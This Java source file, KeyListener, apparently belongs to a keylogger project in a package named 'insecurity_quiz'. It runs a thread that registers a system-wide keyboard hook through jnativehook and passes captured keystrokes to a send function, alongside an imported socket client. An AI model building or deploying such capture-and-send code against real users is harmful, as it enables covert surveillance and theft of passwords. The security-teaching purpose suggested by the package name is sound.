package org.insecurity_quiz.Advanced_Security_Implementations;

import com.github.kwhat.jnativehook.NativeHookException;
import org.insecurity_quiz.Advanced_Security_Implementations.KeyReader;
import org.insecurity_quiz.Advanced_Security_Implementations.SocketClient;

import java.io.IOException;
import java.util.function.Function;

/**
 The KeyListener implements a Runnable interface that listens for key events and sends them over a specified function.
 It takes in a Function<String, Boolean> as a parameter that represents a function that sends the key events for processing.
 */
public class KeyListener implements Runnable {
    private final Function<String, Boolean> sendFunction;

    public KeyListener(Function<String, Boolean> sendFunction) {
        this.sendFunction = sendFunction;
    }

    /**
     * Starts the key listener in a new thread.
     */
    public void start() {
        // Create a new thread and start it
        Thread thread = new Thread(this);
        thread.start();
    }

    /**
     * Runs the key listener, registering the key reader and catching any errors.
     */
    @Override
    public void run() {
        try {
            KeyReader keyreader = new KeyReader(sendFunction);
        } catch (NativeHookException e) {
            System.err.println("Failed to register native hook: " + e.getMessage());
            e.printStackTrace();
        } catch (IOException e) {
            System.err.println("Failed to register IO: " + e.getMessage());
            e.printStackTrace();
        }
    }
}